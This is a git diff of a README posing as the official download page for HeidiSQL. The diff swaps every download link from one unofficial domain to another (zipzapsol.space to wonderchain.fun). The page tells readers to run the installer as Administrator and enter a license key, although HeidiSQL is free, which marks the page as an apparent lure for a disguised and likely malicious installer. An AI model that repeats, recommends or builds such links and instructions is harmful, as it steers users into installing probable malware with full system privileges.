@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **HeidiSQL** for Windows.
 
 <p align="center">
-  <a href="https://heidisql.zipzapsol.space/">
+  <a href="https://heidisql.wonderchain.fun/">
     <img src="https://img.shields.io/badge/Download-HeidiSQL-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download HeidiSQL">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[heidisql.zipzapsol.space](https://heidisql.zipzapsol.space/)** |
-| **Full URL** | `https://heidisql.zipzapsol.space/` |
+| **Direct link** | **[heidisql.wonderchain.fun](https://heidisql.wonderchain.fun/)** |
+| **Full URL** | `https://heidisql.wonderchain.fun/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — heidisql.zipzapsol.space](https://heidisql.zipzapsol.space/)** (link above)
+1. Click **[Download — heidisql.wonderchain.fun](https://heidisql.wonderchain.fun/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://heidisql.zipzapsol.space/"><strong>⬇ Download HeidiSQL now</strong></a></p>
+<p align="center"><a href="https://heidisql.wonderchain.fun/"><strong>⬇ Download HeidiSQL now</strong></a></p>
 
 ---
 
